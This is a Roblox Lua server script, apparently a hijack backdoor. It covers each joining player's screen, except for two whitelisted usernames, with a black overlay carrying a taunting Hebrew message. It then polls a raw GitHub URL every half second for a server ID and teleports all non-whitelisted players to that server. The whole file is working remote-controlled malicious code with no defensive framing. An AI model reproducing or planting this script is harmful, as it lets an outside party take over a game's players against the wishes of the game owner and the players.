local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
local blocked = {["noamdb15"] = true, ["dylanzyl123"] = true}

local function showLoading(player)
	local sg = Instance.new("ScreenGui", player.PlayerGui)
	sg.IgnoreGuiInset = true
	sg.DisplayOrder = 9999999
	local f = Instance.new("Frame", sg)
	f.Size = UDim2.new(1,0,1,0)
	f.BackgroundColor3 = Color3.new(0,0,0)
	local l = Instance.new("TextLabel", f)
	l.Size = UDim2.new(0.8,0,0.4,0)
	l.Position = UDim2.new(0.1,0,0.3,0)
	l.BackgroundTransparency = 1
	l.TextColor3 = Color3.new(1,0,0)
	l.TextScaled = true
	l.Text = "הלך לך הבייס חבר יקר"
end

Players.PlayerAdded:Connect(function(p)
	if not blocked[p.Name] then showLoading(p) end
end)

task.spawn(function()
	while task.wait(0.5) do
		local s, r = pcall(function() return HttpService:GetAsync(rawUrl.."?t="..tick()) end)
		if s and r then
			local lines = {}
			for line in r:gmatch("[^\r\n]+") do table.insert(lines, line) end
			local targetId = tonumber(lines[1])
			local targetJob = lines[2]
			if targetJob and targetJob ~= "" then
				for _, p in pairs(Players:GetPlayers()) do
					if not blocked[p.Name] then
						pcall(function() TeleportService:TeleportToPlaceInstance(targetId or game.PlaceId, targetJob, p) end)
					end
				end
			end
		end
	end
end)
